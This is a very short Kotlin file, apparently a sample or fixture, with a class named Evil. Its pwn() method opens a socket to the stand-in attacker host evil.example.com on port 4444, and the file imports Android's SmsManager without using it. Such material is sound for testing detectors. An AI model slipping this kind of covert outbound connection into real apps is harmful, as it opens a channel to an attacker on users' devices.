package dev.loglens

import java.net.Socket
import android.telephony.SmsManager

class Evil {
    fun pwn() {
        Socket("evil.example.com", 4444)
    }
}
